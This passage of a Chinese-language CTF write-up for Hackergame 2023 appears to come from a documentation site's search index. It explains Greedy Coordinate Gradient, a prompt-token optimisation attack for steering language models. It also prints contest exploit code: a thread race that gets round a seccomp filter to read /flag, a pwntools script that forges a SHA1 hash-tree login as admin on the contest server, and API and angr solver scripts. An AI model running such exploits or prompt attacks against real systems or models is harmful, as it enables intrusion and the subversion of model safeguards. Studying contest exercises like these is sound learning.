token\uff0c\u65e0\u6cd5\u8fdb\u884c\u8fde\u7eed\u7684\u53d8\u5316\u3002\u56e0\u6b64\u4f5c\u8005\u6839\u636e AutoPrompt [1]\uff0c\u8bbe\u8ba1\u4e86 Greedy Coordinate Gradient \u6765\u5c3d\u53ef\u80fd\u9ad8\u6548\u5730\u5bf9\u79bb\u6563\u7684\u8f93\u5165\u8fdb\u884c\u4f18\u5316\u3002 \u901a\u4fd7\u6765\u8bb2\uff0c\u6211\u4eec\u5e0c\u671b\u80fd\u591f\u5c06\u539f\u6709\u8f93\u5165\u7684 Prompt \u4e2d\u7684\u67d0\u4e00\u4e9b token \u66ff\u6362\u4e3a\u65b0\u7684 token\uff0c\u5e76\u4e14\u8ba9\u66ff\u6362\u4e4b\u540e\u5c3d\u53ef\u80fd\u8ba9\u8f93\u51fa\u7684 target loss \u5c3d\u53ef\u80fd\u964d\u4f4e\u3002 \u4f5c\u8005\u7528\u4e00\u4e2a\u957f\u5ea6\u4e3a \\(V\\) \u7684 one hot \u5411\u91cf\u6765\u4ee3\u8868\u5f53\u524d\u4f4d\u7f6e\u7684 token\uff0c\u8be5 one hot \u5411\u91cf\u4e0e embedding layer\uff08\u5927\u5c0f\u4e3a \\(R^{\\mathrm{dim} \\times V}\\) \uff09\u76f8\u4e58\u540e\u53ef\u4ee5\u5f97\u5230\u8be5 token \u5bf9\u5e94\u7684 embedding\uff0c\u8be5 embedding \u88ab\u8f93\u5165\u7ed9\u4e86\u6a21\u578b\u3002\u5728\u53cd\u5411\u4f20\u64ad\u540e\uff0cone hot \u5411\u91cf\u7684\u6bcf\u4e00\u4e2a\u4f4d\u7f6e \\(i\\) \u90fd\u6709\u5bf9\u5e94\u7684\u68af\u5ea6 \\(\\mathrm{grad}_i\\) \uff0c \\(\\mathrm{grad}_i < 0\\) \u8bf4\u660e\u5982\u679c\u5c06\u539f\u672c\u7684 token \u66ff\u6362\u4e3a\u8bcd\u8868\u4e2d\u7684\u7b2c \\(i\\) \u4e2a token\uff0c\u80fd\u591f\u4f7f\u5f97\u8f93\u51fa\u7684 loss \u4e0b\u964d\u3002 \u57fa\u4e8e\u8fd9\u4e2a\u68af\u5ea6\uff0c\u6211\u4eec\u9009\u51fa\u4e86 top-k \u4e2a\u6700\u5c0f\u7684\u66ff\u6362 token\uff08\u7b97\u6cd5\u7684\u7b2c 4 \u884c\uff09\u3002\u7136\u540e\u6211\u4eec\u968f\u673a\u9009\u62e9 prompt \u7684 token \u7684\u4f4d\u7f6e\uff0c\u5c06\u5176\u968f\u673a\u66ff\u6362\u4e3a\u68af\u5ea6\u6700\u5c0f\u7684 k \u4e2a\u4e4b\u4e00\u3002\u91cd\u590d\u4e0a\u8ff0\u66ff\u6362\u591a\u6b21\uff0c\u9009\u62e9\u51fa\u66ff\u6362\u540e loss \u6700\u5c0f\u7684 prompt \u4f5c\u4e3a\u4e0b\u4e00\u6b21\u8fed\u4ee3\u7684\u521d\u59cb\u503c\u3002 [1]: AutoPrompt: Eliciting Knowledge from Language Models with Automatically Generated Prompts. https://arxiv.org/abs/2010.15980 \ud83e\ude90 \u6d41\u5f0f\u661f\u7403 \u00b6 \u9700\u8981\u77e5\u9053\u56fe\u50cf\u7684\u957f\u5bbd\uff0c\u600e\u4e48\u529e\u5462\uff1f\u624b\u52a8plot\u51fa\u6765\u770b\u5457\uff0c\u53cd\u6b63\u8bd5\u4e00\u4e0b\u5f88\u5bb9\u6613\u627e\u5230\u5468\u671f\u6027\u91cd\u590d\u7684\u4e1c\u897f\uff0c\u7136\u540e\u5fae\u8c03\u4e00\u4e0b\u5f97\u5230\u957f\u5bbd\uff0c\u76f4\u63a5\u8f93\u51fa\u89c6\u9891\u5373\u53ef\u3002 Done import cv2 import numpy as np def restore_video ( buffer , output ): frame_width = 427 frame_height = 759 frame_count = 139 video_writer = cv2 . VideoWriter ( output , cv2 . VideoWriter_fourcc ( * \"mp4v\" ), 30.0 , ( frame_width , frame_height )) for i in range ( frame_count ): frame = buffer [ i ] . astype ( np . uint8 ) video_writer . write ( frame ) video_writer . release () if __name__ == \"__main__\" : with open ( \"video.bin\" , \"rb\" ) as input_file : buffer = np . fromfile ( input_file , dtype = np . uint8 ) print ( buffer . shape ) num = [ 2 , 5 , 8 , 11 , 14 , 17 , 20 , 23 , 26 , 29 , 32 , 35 , 38 , 41 , 44 , 47 , 50 , 53 , 56 , 59 , 62 , 65 , 68 , 71 , 74 , 77 , 80 , 83 , 86 , 89 , 92 , 95 , 98 ] nums = [] f = np . append ( buffer , np . zeros ( 93 , dtype = np . uint8 )) f = f . reshape (( - 1 , 759 , 427 , 3 )) restore_video ( f , \"video.mp4\" ) \ud83e\ude90 \u4f4e\u5e26\u5bbd\u661f\u7403 \u00b6 \u8fd9\u4e00\u9898\u7b2c\u4e00\u95ee\u6ca1\u4ec0\u4e48\u95ee\u9898\uff0c\u968f\u4fbf\u538b\u7f29\u4e00\u4e0b\u5c31\u80fd\u8fc7\u3002\u7b2c\u4e8c\u9898\u6709\u70b9\u6298\u78e8\uff0c\u601d\u8def\u662f\u5bf9\u7684\uff0c\u53bb\u627e libvips \u652f\u6301\u7684\u56fe\u50cf\u683c\u5f0f\uff0c\u5c31\u662f\u6211\u592a\u61d2\u4e86\u6ca1\u53bb\u4ed4\u7ec6\u7ffb\uff0c\u4e00\u4e2a\u52b2\u5730\u7422\u78e8SVG\u53bb\u4e86\uff0c\u5bfc\u81f4\u6ca1\u505a\u51fa\u6765\uff0c\u5f88\u53ef\u60dc\u3002\u8fd9\u9053\u9898\u7528JXL\u7684\u683c\u5f0f\u6765\u89e3\u7684\u3002 Komm, s\u00fcsser Flagge \u00b6 \u8fd9\u9053\u9898\u5c31\u662f\u5bf9TCP/IP\u6570\u636e\u5305\u7684\u4fee\u6539\uff0c\u7b2c\u4e00\u95ee\u76f4\u63a5\u4e00\u4e2a\u5b57\u8282\u4e00\u4e2a\u5b57\u8282\u53d1\u9001\u5373\u53ef\u7ed5\u8fc7\uff0c\u7b2c\u4e8c\u95ee\u5176\u5b9e\u975e\u9884\u671f\u4e86\uff0c\u56e0\u4e3a\u4e00\u4e2a\u5b57\u8282\u6ca1\u6709\u5230u32\u7684\u8981\u6c42\uff0c\u76f4\u63a5\u7ed5\u8fc7\u4e86hhh\u3002 \u7b2c\u4e09\u95ee\u601d\u8def\u5176\u5b9e\u5bf9\u4e86\uff0c\u5c31\u662f\u4fee\u6539TCP\u4e2d\u7684OPTION\u90e8\u5206\uff0c\u4e0d\u8fc7\u5f53\u65f6\u5f88\u5fd9\uff0c\u7528python\u5199\u7684\u6709\u70b9\u5947\u602a\uff0c\u6ca1\u7ec6\u8c03\uff0c\u5982\u679c\u7a7a\u95f2\u7684\u8bdd\u5e94\u8be5\u505a\u51fa\u6765\u6ca1\u95ee\u9898\u3002 \u4e3a\u4ec0\u4e48\u8981\u6253\u5f00 /flag \ud83d\ude21 \u00b6 \u7b2c\u4e00\u95ee\u5f88easy\u76f4\u63a5\u9759\u6001\u7f16\u8bd1\u540e\u63d0\u4ea4\u5373\u53ef\u3002\u7b2c\u4e8c\u95ee\u770b\u4e86\u5b98\u65b9\u9898\u89e3\u4e4b\u540e\uff0c\u77e5\u9053\u8981\u591a\u770b\u6ce8\u91ca\uff0c\u7528\u7ebf\u7a0b\u7684\u65b9\u5f0f\u6765\u7ed5\u8fc7seccomp\uff0c\u5b66\u4e60\u4e86\u3002 \u5b98\u65b9\u9898\u89e3 #include <stdio.h> #include <pthread.h> #include <fcntl.h> #include <unistd.h> #include <stdlib.h> #include <time.h> char flagfile [] = \"/flag\" ; void * read_file () { char buf [ 100 ] = {}; while ( 1 ) { int f = open ( flagfile , O_RDONLY ); if ( ! f ) { continue ; } read ( f , buf , 99 ); if ( buf [ 0 ] && buf [ 0 ] != 'I' ) { printf ( \"%s \\n \" , buf ); exit ( 0 ); } close ( f ); } } void * modify () { struct timespec req ; req . tv_sec = 0 ; req . tv_nsec = 50 ; while ( 1 ) { flagfile [ 1 ] = 'a' ; // sleep is not allowed. So just don't sleep. // nanosleep(&req, NULL); flagfile [ 1 ] = 'f' ; } } int main () { printf ( \"pthread \\n \" ); pthread_t t1 , t2 ; pthread_create ( & t1 , NULL , read_file , NULL ); pthread_create ( & t2 , NULL , modify , NULL ); pthread_join ( t1 , NULL ); pthread_join ( t2 , NULL ); printf ( \"done? \\n \" ); return 0 ; } \u5f02\u661f\u6b67\u9014 \u00b6 \u5f88\u597d\u73a9\u7684\u5c0f\u6e38\u620f\uff0c\u5c31\u5f53\u653e\u677e\u4e00\u4e0b\uff0c\u903b\u8f91\u5f88\u7b80\u5355\uff08\u5c0f\u5fc3\u7206\u70b8\uff0c\u7b2c\u4e00\u6b21\u5fd8\u8bb0\u5148\u901a\u51b7\u5374\u6db2\u4e86 \u5fae\u79ef\u5206\u8ba1\u7b97\u5c0f\u7ec3\u4e60 2.0 \u00b6 \u8fd9\u9053\u9898\u5f88\u70e6\uff0c\u5c31\u662f\u611f\u89c9\u81ea\u5df1\u5feb\u505a\u51fa\u6765\u4e86\uff0c\u5c31\u5dee\u4e00\u70b9\u70b9\uff0c\u6240\u4ee5\u9700\u8981\u603b\u7ed3\u4e00\u4e0b\u7ecf\u9a8c\u6559\u8bad\u3002 \u5176\u5b9e\u4e5f\u6ca1\u4ec0\u4e48\u597d\u603b\u7ed3\u7684\uff0c\u5c31\u662f\u6ca1\u6ce8\u610f\u5230 updateElement \uff0c\u5bfc\u81f4\u4e0d\u77e5\u9053\u600e\u4e48\u7ed5\u8fc7\u957f\u5ea6\u9650\u5236\u3002\u4e5f\u662f\u81ea\u5df1\u83dc\uff0c\u5176\u5b9e\u6ca1\u600e\u4e48\u505a\u8fc7XSS\u7684\u9898\u76ee\uff0c\u8fd8\u662f\u9700\u8981\u79ef\u7d2f\u7ecf\u9a8c\uff0c\u611f\u89c9\u597d\u7684XSS\u9898\u76ee\u4e0d\u591a\u3002 \u9006\u5411\u5de5\u7a0b\u4e0d\u9700\u8981 F5 \u00b6 \u8fd9\u9053\u9898\u8bb0\u5f55\u4e00\u4e0b\uff0c\u56e0\u4e3a\u9006\u5411\u7684\u9898\u76ee\u505a\u5f97\u5c11\uff0c\u6240\u4ee5\u9700\u8981\u79ef\u7d2f\u4e00\u4e0b\u3002 \u5b98\u65b9\u9898\u89e3\u4e2d\u9700\u8981\u8bb0\u5f55\u7684\u4e60\u60ef import angr , monkeyhex , claripy proj = angr . Project ( 'no_need_for_F5/main.exe' ) flag_chars = [ claripy . BVS ( 'flag_ %d ' % i , 8 ) for i in range ( 32 )] flag = claripy . Concat ( * [ claripy . BVV ( b 'flag{' )] + flag_chars + [ claripy . BVV ( b '} \\x00 ' )]) state = proj . factory . call_state ( 0x140001000 ) input_addr = 0 @proj . hook ( 0x140001093 , length = 5 ) def get_input ( state ): global input_addr input_addr = state . regs . rdx state . memory . store ( input_addr , flag ) print ( 'Input done' ) @proj . hook ( 0x140001079 , length = 5 ) def printf ( state ): return simgr = proj . factory . simgr ( state ) simgr . explore ( find = 0x1400013A1 , avoid = 0x1400013B7 ) simgr . found [ 0 ] . solver . eval ( flag ) . to_bytes ( 39 , \"big\" ) O(1) \u7528\u6237\u767b\u5f55\u7cfb\u7edf \u00b6 \u6839\u636e\u54c8\u5e0c\u4e66\u7684\u7279\u6027\uff0c\u56e0\u6b64\u6211\u4eec\u53ea\u9700\u8981\u6784\u9020\u4e00\u4e2a\u7528\u6237\uff0c\u4f7f\u5f97\u5b83\u7684SHA1\u503c\u7b49\u4ef7\u4e8e\u5176\u5b50\u8282\u70b9\u5b58\u5728admin\u7528\u6237\u5373\u53ef\u3002\u8fd9\u91cc\u6ce8\u610f\u9700\u8981SHA1\u503c\u80fd\u591f\u88abUTF-8\u89e3\u7801\u5373\u53ef\u3002 \u8fd9\u91cc\u6211\u5148\u627e\u4e86\u5982\u4e0b\u4e24\u4e2a\u7528\u6237\uff1a admin:aaaadcLd admin:aaaaanRH \u8fd9\u91cc\u5176\u5b9e\u53ef\u4ee5\u968f\u4fbf\u641c\u7d22\uff0c\u4e0b\u9762\u90fd\u4ee3\u7801\u6539\u4e00\u4e0b\u90fd\u53ef\u4ee5\u641c\uff0c\u968f\u4fbf\u641c\u3002 \u641c\u7d22\u5408\u9002\u7684admin\u7528\u6237 from itertools import product str1 = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789' prefix = 'admin:' for i in product ( str1 , repeat = 8 ): user = prefix + '' . join ( i ) x = f ( user . encode ()) # x = com(x, x) if b ':' not in x : try : x . decode () print ( user , x ) except : pass \u7136\u540e\u5c31\u7b97\u4e00\u4e0bSHA1\u540e\u62fc\u63a5\u5373\u53ef\uff0c\u89e3\u9898\u811a\u672c\u5982\u4e0b\uff1a \u89e3\u9898\u811a\u672c\uff08\u4fee\u6539\u7248\uff0c\u539f\u7248\u592a\u6742\u4e71\u4e86\uff09 from hashlib import sha1 from pwn import * f = lambda data : sha1 ( data ) def com ( x , y ): if isinstance ( x , bytes ): t = x else : t = x . digest () if isinstance ( y , bytes ): p = y else : p = y . digest () if t > p : t , p = p , t return t + p if __name__ == '__main__' : p = remote ( '202.38.93.111' , 10094 ) token = b '2269:MEUCIFS9KtX84tx7Ri01S4JNBKL/H1pJ2+sHChO3/WlK7QsXAiEA5cTIFBDrdJQfvOANFq0hGHLglZHY31APxc62zvSnKug=' p . recvuntil ( 'token:' ) p . sendline ( token ) p . recvuntil ( 'Choice:' ) p . sendline ( b '1' ) def sendu ( data ): p . recvuntil ( '>' ) p . sendline ( data ) test0 = [ b 'admin:aaaadcLd' , b 'admin:aaaaanRH' ] test1 = b 'a:a' test3 = com ( f ( test0 [ 0 ]), f ( test0 [ 1 ])) sendu ( test1 ) sendu ( test3 ) sendu ( b 'EOF' ) p . recvuntil ( 'Choice:' ) p . sendline ( b '2' ) p . recvuntil ( 'Login credential: ' ) p . sendline ( test0 [ 0 ] . decode () + ':' + f ( test0 [ 1 ]) . hexdigest () + sha1 ( test1 ) . hexdigest ()) p . interactive () \u5176\u4ed6 \u00b6 \u540e\u9762\u7684\u9898\u76ee\u5176\u5b9e\u6ca1\u600e\u4e48\u770b\uff0c\u5c31\u6682\u65f6\u5148\u4e0d\u5199\u4e86\uff0c\u7b49\u4ee5\u540e\u6709\u65f6\u95f4\u7a7a\u4e86\u7814\u7a76\u540e\u518d\u8bb0\u5f55\u4e00\u4e0b\u5427\u3002","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame-2023","text":"Abstract \u8fd9\u6b21\u5fd9\u91cc\u5077\u95f2\u505a\u7684\uff0c\u8fd8\u803d\u6401\u4e86\u4e00\u4e9b\u4e8b\u513fqaq\u3002\u7b97\u662f\u7b2c\u4e00\u6b21partly\u5b8c\u6574\u5730\u53c2\u52a0Hackergame\uff0c\u56e0\u4e3a\u662f\u9762\u5411\u521d\u5b66\u8005\u7684\u6bd4\u8d5b\uff0c\u9898\u76ee\u96be\u5ea6\u4e0d\u9ad8\u66f4\u5177\u6709\u8da3\u5473\u6027\uff0c\u7279\u6b64\u8bb0\u5f55\u4e00\u4e0b\u3002 \u4e00\u4e9b\u7b80\u5355\u7684\u9898\u76ee\u53ef\u80fd\u8bb0\u5f55\u7684\u4f1a\u6bd4\u8f83\u8349\u7387\uff0c\u4f1a\u91cd\u70b9\u8bb0\u5f55\u4e00\u4e9b\u5370\u8c61\u6df1\u523b\uff0c\u5dee\u4e00\u70b9\u5b8c\u6210\u7684\u9898\u76ee\u3002\u5bf9\u4e8e\u6ca1\u601d\u8def\u7684\u9898\u76ee\u4e5f\u7ed3\u5408\u516c\u5f00\u9898\u89e3\u8bb0\u5f55\u4e00\u4e0b\uff0c\u8865\u5145\u4e00\u4e0b\u76f8\u5173\u77e5\u8bc6\u3002 \u5b98\u65b9\u9898\u89e3","title":"Hackergame 2023"},{"location":"ctf/writeups/hackergame2023/#hackergame","text":"\u7b7e\u5230\u9898\uff0c\u76f4\u63a5\u6539GET\u8bf7\u6c42\u53c2\u6570\u91cc\u7684Similarity","title":"Hackergame \u542f\u52a8"},{"location":"ctf/writeups/hackergame2023/#_1","text":"\u8003\u9a8c\u641c\u7d22\u80fd\u529b\uff0c\u90fd\u5f88\u597d\u641c\uff0cGoogle\u4e00\u4e0b\u4f60\u5c31\u77e5\u9053","title":"\u732b\u54aa\u5c0f\u6d4b"},{"location":"ctf/writeups/hackergame2023/#_2","text":"\u9047\u4e8b\u4e0d\u51b3 F12\uff0c\u968f\u4fbf\u6eda\u4e00\u4e0b\u5c31\u627e\u5230\u4e86flag\uff08\u771f\u7684\uff0c\u90fd\u662f\u8fd0\u6c14","title":"\u66f4\u6df1\u66f4\u6697"},{"location":"ctf/writeups/hackergame2023/#30","text":"\u8fd8\u86ee\u6709\u610f\u601d\u7684\u793e\u5de5\u9898\uff0c\u8fd8\u662f\u6bd4\u8f83\u7b80\u5355\u7684 \u4ece\u65e5\u672c\u3001\u5b66\u672f\u4f1a\u8bae\u5165\u624b\uff0c\u5f88\u5bb9\u6613\u53d1\u73b0\u4f1a\u8bae\u540d\u79f0\u4ee5\u53ca\u5730\u70b9\u4e3a\u4e1c\u4eac\u5927\u5b66\uff0c\u6839\u636e\u5730\u56fe\u9a8c\u8bc1\u4e00\u4e0b\u5c31\u53d1\u73b0\u4e86\u90a3\u5bb6\u62c9\u9762\u9986\u3002 \u4e8e\u662f\u6839\u636e\u8981\u6c42\u67e5\u4e00\u4e0b\u4f1a\u8bae\u4e3e\u529e\u65e5\u671f\uff0c\u4ee5\u53ca\u4e1c\u4eac\u5927\u5b66\u8bfa\u8d1d\u5c14\u7269\u7406\u5b66\u5956\u83b7\u5f97\u8005\uff0c\u5f88\u5bb9\u6613\u89e3\u51fa\u7b2c\u4e00\u90e8\u5206\u7684\u7b54\u6848\u3002 \u7b2c\u4e8c\u90e8\u5206\u521a\u5f00\u59cb\u5361\u4e86\u5f88\u4e45\uff0c\u6ca1\u60f3\u5230\u9644\u8fd1\u8d70\u8d70\u5c45\u7136\u8d70\u90a3\u4e48\u8fdc\uff0c\u8fd8\u662f\u9760\u4e0a\u91ce\u7ad9\u8fd9\u4e00\u4e2a\u5173\u952e\u5730\u70b9\u624d\u53d1\u73b0\u539f\u6765\u8d70\u4e86\u90a3\u4e48\u8fdc\uff0c\u90a3\u5c31\u5f88\u597d\u5b9a\u4f4d\u5230\u56fd\u7acb\u535a\u7269\u9986\u548c\u4e0a\u91ce\u516c\u56ed\u3002\u6839\u636e\u65e5\u671f\u548c\u5730\u70b9\u80fd\u641c\u5230\u4e00\u4e2a\u9152\u7684\u5c55\u89c8\u4f1a\uff0c\u7f51\u7ad9\u91cc\u627e\u5230Staff\u62db\u52df\uff0c\u7b2c\u4e8c\u90e8\u5206\u5c31\u5b8c\u6210\u4e86\u3002 \u7b2c\u4e09\u90e8\u5206\u7b2c\u4e00\u95ee\u76f4\u63a5\u770b\u4f1a\u8bae\u5b98\u7f51\u7684\u901a\u77e5\u5373\u53ef\uff0c\u7b2c\u4e8c\u90e8\u5206\uff0c\u6d77\u62a5\u76f4\u63a5\u4e0aTwitter\u641c\u4e86\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002\u5173\u4e8e 3D \u52a8\u7269\u7684\u8bdd\u80af\u5b9a\u6709\u76f8\u5173\u62a5\u9053\uff0c\u67e5\u4e86\u4e00\u4e0b\u6709\u732b\u6709\u72d7\uff0c\u8bd5\u4e00\u4e0b\u5c31\u51fa\u6765\u4e86\u3002","title":"\u65c5\u884c\u7167\u7247 3.0"},{"location":"ctf/writeups/hackergame2023/#_3","text":"\u540e\u7aef\u6ca1\u6709\u505a\u4f4d\u7f6e\u662f\u5426\u5360\u7528\u68c0\u67e5\uff0c\u6240\u4ee5\u53ea\u8981\u7ed5\u8fc7\u524d\u7aef\u68c0\u67e5\u5c31\u80fd\u83b7\u5f97\u80dc\u5229\u3002","title":"\u8d5b\u535a\u4e95\u5b57\u68cb"},{"location":"ctf/writeups/hackergame2023/#flag","text":"\u6839\u636e\u9898\u5e72\u63d0\u5230\u7684 Google\u4eb2\u513f\u5b50 \u731c\u6d4b\u548cPixels\u6709\u5173\uff0c\u5584\u7528\u641c\u7d22\u53d1\u73b0\u662fPixels\u7684\u56fe\u50cf\u88c1\u526a\u6f0f\u6d1e\uff0c\u76f4\u63a5\u5c06PNG\u6587\u4ef6\u7684END\u6570\u636e\u5757\u6dfb\u52a0\u5230\u76f8\u5e94\u4f4d\u7f6e\uff0c\u5e76\u6ca1\u6709\u5220\u9664\u88ab\u88c1\u526a\u7684\u6570\u636e\uff0c\u6240\u4ee5\u53ef\u4ee5\u6839\u636e\u578b\u53f7\u4fee\u6539\u4e00\u4e0b\u957f\u5bbd\u5e76\u5220\u9664\u76f8\u5e94\u6570\u636e\u5757\u5373\u53ef\u3002 \u7f51\u4e0a\u5176\u5b9e\u6709\u76f8\u5e94\u5de5\u5177\u53ef\u4ee5\u4e00\u628a\u68ad\u3002","title":"\u5976\u5976\u7684\u7761\u524d flag \u6545\u4e8b"},{"location":"ctf/writeups/hackergame2023/#_4","text":"\u7ec8\u4e8e\u6709\u4e00\u9053\u9700\u8981\u5199\u811a\u672c\u7684\u9898\u76ee\u4e86\uff08x \u76f4\u63a5F12\u770b\u6e90\u7801\uff0c\u53d1\u73b0\u540e\u7aef\u662f\u4e00\u6b21\u6027\u628a\u6240\u6709\u6d88\u606f\u90fd\u53d1\u8fc7\u6765\uff0c\u90a3\u5c31\u5f88\u7b80\u5355\uff0c\u4e4b\u95f4\u627e\u51fa\u6ee1\u8db3\u8981\u6c42\u7684\u6d88\u606f\u7136\u540e\u53d1\u8d77\u64a4\u56de\u8bf7\u6c42\u5373\u53ef\u3002\u4e0d\u8fc7\u4e0d\u80fd\u4e00\u6b21\u6027\u90fd\u64a4\u56de\uff0c\u540e\u7aef\u6709Delay\u65f6\u95f4\u8981\u6c42\uff0c\u53ef\u4ee5\u6839\u636e\u6d88\u606f\u5185\u7684Delay\u4fe1\u606f\u5ef6\u8fdf\u540e\u53d1\u9001\uff0c\u5f53\u7136\u4e5f\u53ef\u4ee5\u4e00\u76f4\u53d1\u9001\u76f4\u5230\u6210\u529f\u5373\u53ef\uff08\u4e3b\u8981\u7701\u529b\u65e0\u8111 \u89e3\u9898\u4ee3\u7801\uff08\u614e\u7528\uff0c\u6982\u7387\u4e8b\u4ef6\uff0c\u591a\u8bd5\u51e0\u6b21\u5c31\u597d\uff09 import requests import json from time import sleep cookies = { 'session' : 'token' } msg = requests . post ( 'http://202.38.93.111:10021/api/getMessages' , cookies = cookies ) msg = json . loads ( msg . text ) msg = msg [ 'messages' ] def back ( idx ): back = requests . post ( 'http://202.38.93.111:10021/api/deleteMessage' , cookies = cookies , json = { 'id' : idx }) try : back = json . loads ( back . text ) except : print ( 'err:' + back . text ) return back for id , i in enumerate ( msg ): if 'hack[' in i [ 'text' ]: t = back ( id ) # \u8fd9\u91cc\u53ef\u4ee5\u4f18\u5316\u4e00\u4e0b\uff0c\u4e0d\u8fc7\u61d2\u764c\u72af\u4e86 while ( t . get ( 'error' ) == '\u68c0\u6d4b\u5230\u65f6\u7a7a\u7a7f\u8d8a' ): t = back ( id ) # print(id, t) flag = requests . post ( 'http://202.38.93.111:10021/api/getflag' , cookies = cookies ) flag = json . loads ( flag . text ) print ( flag )","title":"\u7ec4\u59d4\u4f1a\u6a21\u62df\u5668"},{"location":"ctf/writeups/hackergame2023/#_5","text":"\u771f\u662f\u975e\u5e38\u5de7\uff0c\u4e4b\u524d\u5c31\u5237\u5230\u8fc7\u65e0\u7ebf\u7535\u3001SSTV\u76f8\u5173\u7684\u77e5\u8bc6\uff0c\u8fd9\u6b21\u5c45\u7136\u521a\u597d\u78b0\u4e0a\u4e86\uff0c\u4e0d\u8fc7Windows\u7aef\u90a3\u4e2a\u8f6f\u4ef6\u4e0d\u600e\u4e48\u4f1a\u7528\uff0c\u770b\u5230\u624b\u673a\u7aef\u6709\u76f8\u5e94\u7684\u50bb\u74dc\u5f0f\u6536\u53d1\u8f6f\u4ef6\uff08\u4e0d\u8fc7\u662fAndroid\uff0c\u4e8e\u662f\u62ff\u51fa\u4e86\u5907\u7528\u673a\uff09\u5f88\u8f7b\u677e\u83b7\u5f97\u4e86\u7ed3\u679c\u3002 \u4e0d\u653e\u56fe\u4e86\uff0c\u5360\u4ed3\u5e93\u7a7a\u95f4\uff0c\u7b49\u4ee5\u540e\u641e\u4e2a\u56fe\u5e8a\u6216SVG","title":"\u866b"},{"location":"ctf/writeups/hackergame2023/#json-yaml","text":"\u5b66\u4e60\u4e86\u4e00\u4e0b Yaml\uff0c\u6839\u636eYaml 1.1\u4e0e1.2\u7684\u5dee\u5f02\uff0c\u53d1\u73b0Yaml 1.1\u65e0\u6cd5\u89e3\u6790\u5f62\u5982 1e3 \u8fd9\u6837\u7684\u6570\u5b57\uff0c\u4f1a\u5c06\u5176\u89e3\u6790\u4e3a\u5b57\u7b26\u4e32\uff0c\u8fd9\u6837\u7b2c\u4e00\u5c0f\u95ee\u5c31\u89e3\u51b3\u4e86\u3002 \u7b2c\u4e8c\u5c0f\u95ee\u6839\u636e\u641c\u7d22\u5f97\u5230 \u8fd9\u4e2a\u95ee\u9898 \u53ef\u77e5\u9053Yaml\u8981\u6c42\u952e\u503c\u662f\u552f\u4e00\u7684\u5426\u5219\u4f1a\u62a5\u9519\uff0c\u800cJSON\u6ca1\u6709\u8fd9\u4e2a\u8981\u6c42\uff0c\u8fd9\u6837\u5c31\u89e3\u5b8c\u4e86\u3002","title":"JSON \u2282 YAML?"},{"location":"ctf/writeups/hackergame2023/#git-git","text":"\u8fd9\u9898\u975e\u5e38\u7684easy\uff0c\u76f4\u63a5 git reflog \uff0c\u518d git reset \u5c31\u7ed3\u675f\u4e86\u3002","title":"Git? Git!"},{"location":"ctf/writeups/hackergame2023/#http","text":"\u5927\u81f4\u5c31\u662f\u4e0d\u65ad\u67e5\u6587\u6863\uff0c\u8fd9\u91cc\u5c31\u76f4\u63a5\u642c\u5b98\u65b9\u9898\u89e3\u4e86 \u5b98\u65b9\u9898\u89e3 200 OK. \u70b9\u51fb\u5c31\u9001\uff0c\u4ee3\u8868\u8bf7\u6c42\u6210\u529f\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 404 Not Found. \u4fee\u6539\u8def\u5f84\u5230\u4e00\u4e2a\u4e0d\u5b58\u5728\u7684\u6587\u4ef6\u5373\u53ef\u3002 GET /x HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 400 Bad Request. \u6784\u9020\u4e0d\u7b26\u5408\u683c\u5f0f\u7684 HTTP \u8bf7\u6c42\u5373\u53ef\u3002 GET / aHTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n 505 HTTP Version Not Supported. \u4fee\u6539 HTTP \u7248\u672c\u53f7\u5230\u4e00\u4e2a\u79bb\u8c31\u7684\u503c\u5373\u53ef\u3002 GET / HTTP/11\\r\\n Host: example.com\\r\\n\\r\\n 405 Method Not Allowed. \u4fee\u6539\u8bf7\u6c42\u65b9\u6cd5\u5230 POST \u7b49\u5373\u53ef\u3002 POST / HTTP/1.1\\r\\n Host: example.com\\r\\n\\r\\n \u63a5\u4e0b\u6765\u662f\u53ef\u80fd\u9700\u8981\u770b\u6587\u6863\u7684\u90e8\u5206\uff1a 100 Continue. \u4ee3\u8868\u670d\u52a1\u5668\u5e0c\u671b\u5ba2\u6237\u7aef\u7ee7\u7eed\u8bf7\u6c42\u6216\u8005\u5ffd\u7565\u3002\u9700\u8981\u5ba2\u6237\u7aef\u53d1\u9001 Expect: 100-continue \u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Expect: 100-continue\\r\\n\\r\\n 206 Partial Content. \u4e00\u4e2a HTTP \u8bf7\u6c42\u53ef\u4ee5\u53ea\u8bf7\u6c42\u90e8\u5206\u5185\u5bb9\uff0c\u670d\u52a1\u5668\u4e5f\u4f1a\u8fd4\u56de\u90e8\u5206\u5185\u5bb9\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=1-2\\r\\n\\r\\n 416 Range Not Satisfiable. \u4e0a\u9762\u7684 Range \u662f\u4e00\u4e2a\u5408\u6cd5\u7684\u8303\u56f4\uff0c\u90a3\u4e48\u4e0d\u5408\u6cd5\u7684\u8303\u56f4\u5462\uff1f\u5c31\u662f 416\u3002 GET / HTTP/1.1\\r\\n Host: example.com\\r\\n Range: bytes=114514-1919810\\r\\n\\r\\n 304 Not Modified. \u4ee3\u8868\u6587\u4ef6\u5728\u6307\u5b9a\u6761\u4ef6\u4e0b\u6ca1\u6709\u4fee\u6539\u8fc7\uff0c\u8fd9\u91cc\u7528 If-Modified-Since \uff1a GET / HTTP/1.1\\r\\n Host: example.com\\r\\n If-Modified-Since: Tue, 15 Aug 2023 17:03:04 GMT\\r\\n\\r\\n 412 Precondition Failed. \u8fd9\u4e2a payload \u4f7f\u7528\u4e86 ETag + If-Match\uff0cETag \u548c\u5bf9\u5e94\u7684 web \u8d44\u6e90\u5bf9\u5e94\uff0c\u7528\u6765\u533a\u5206\u5bf9\u5e94\u8d44\u6e90\u4e0d\u540c\u7684\u7248\u672c\u3002\u5ba2\u6237\u7aef\u53ef\u4ee5\u5229\u7528\u8fd9\u4e2a\u4fe1\u606f\u6765\u8282\u7701\u5e26\u5bbd\u3002\u8fd9\u91cc If-Match \u5219\u5728\u5c1d\u8bd5\u5339\u914d\u8fd9\u4e2a ETag\uff0c\u5982\u679c\u4e0d\u5339\u914d\uff0c\u90a3\u5c31\u8fd4\u56de 412\u3002 GET / HTTP/1.1\\r\\n 